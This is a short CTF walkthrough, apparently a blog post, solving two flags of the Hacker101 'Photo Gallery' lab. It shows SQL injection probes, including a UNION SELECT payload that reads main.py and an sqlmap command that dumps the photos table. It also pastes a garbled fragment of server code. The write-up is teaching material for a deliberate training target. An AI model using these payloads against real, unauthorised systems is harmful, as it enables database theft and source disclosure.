---
title: Photo Gallery
published: true 
tags: Hacker101
---

# Flag 0

### Hints:
* Consider how you might build this system yourself. What would the query for fetch look like?
* Take a few minutes to consider the state of the union
* This application runs on the uwsgi-nginx-flask-docker image

Suspicous is that the last kitten is not visible and used space is 0. I found sql injection error in URL. 
Going to /fetch?id=1 will return image, of course user can maniulate value of that param. That SQL query return one column because:
```
?id=1 order by 1 # -> return data
?id=1 order by 2 # -> cause error.
```

When I realized that many python apps has main.py I try this:
```
11 union select "main.py"
```
that return main.py file content, and in that file is hidden flag. There isn't picture with id 11 so first query didn't return any data. 

![Flag](assets/photo-gallery/flag0/flag.png)

* * *

# Flag 1

### Hints:
* I never trust a kitten I can't see
* Or a query whose results I can't see, for that matte

When I was looking for flag 0 I identify SQL injection vulnerability. So I decide to dump data from database. 
```
\n' % sanitize(title) rep += '
' cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, )) fns = [] for pid, ptitle, pfn in cur.fetchall(): rep += '
``` 
That part of code give me knowledge about table where photos are stored. Flag should be somewhere in that table, I guess. Dump data with sqlmap:
```
sqlmap -u http://xxx.xxx.xxx.xxx/xxxxxxxx/fetch?id=1 --dump -T photos --threads 10
```

![Flag](assets/photo-gallery/flag1/flag.png)

As I expect flag is in the photos table.